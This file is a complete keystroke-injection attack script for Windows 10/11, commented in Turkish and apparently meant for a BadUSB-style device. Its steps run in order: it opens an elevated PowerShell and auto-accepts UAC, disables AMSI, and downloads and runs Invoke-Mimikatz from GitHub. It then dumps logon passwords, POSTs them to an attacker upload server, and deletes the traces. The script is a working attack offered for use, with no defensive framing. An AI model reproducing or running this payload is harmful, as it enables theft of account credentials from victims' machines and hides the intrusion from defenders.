// ═══════════════════════════════════════════════════════════════════════════
// Payload: win_mimikatz.js
// Target:  Windows 10/11 (Admin gerekli)
// Time:    ~15 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: Mimikatz ile credential dump - Memory'den şifreleri çıkarır
// WARNING: AV tetikleyebilir, AMSI bypass gerekli
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION                                                            │
// └─────────────────────────────────────────────────────────────────────────┘
var EXFIL_URL = "http://ATTACKER_IP:8080/upload";  // Exfil sunucu adresi

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN ADMIN POWERSHELL                                           │
// └─────────────────────────────────────────────────────────────────────────┘
press("GUI-r");
delay(500);
type("powershell Start-Process powershell -Verb runAs");
press("ENTER");
delay(2500);

// UAC onayı (kullanıcı izliyorsa)
press("LEFT");
delay(100);
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: AMSI BYPASS                                                     │
// └─────────────────────────────────────────────────────────────────────────┘
// AMSI'yi devre dışı bırak
type("$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};");
type("$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like '*Context'){$f=$e}};");
type("$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);");
type("[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)");
press("ENTER");
delay(1000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: DOWNLOAD AND EXECUTE MIMIKATZ                                   │
// └─────────────────────────────────────────────────────────────────────────┘
// Invoke-Mimikatz indir ve çalıştır
type("IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')");
press("ENTER");
delay(5000);

// Credential dump
type("$creds = Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'");
press("ENTER");
delay(5000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: SAVE AND EXFILTRATE                                             │
// └─────────────────────────────────────────────────────────────────────────┘
// Sonuçları kaydet
type("$creds | Out-File $env:TEMP\\creds.txt -Encoding UTF8");
press("ENTER");
delay(1000);

// Exfil (opsiyonel)
type("try { Invoke-WebRequest -Uri '" + EXFIL_URL + "' -Method POST -InFile $env:TEMP\\creds.txt } catch {}");
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("Remove-Item $env:TEMP\\creds.txt -Force -ErrorAction SilentlyContinue");
press("ENTER");
delay(500);
type("exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ NOTES                                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
// - Admin yetkileri gerekli
// - Windows Defender devre dışı olmalı veya bypass edilmeli
// - Exfil sunucusu: python3 exfil_server.py -p 8080

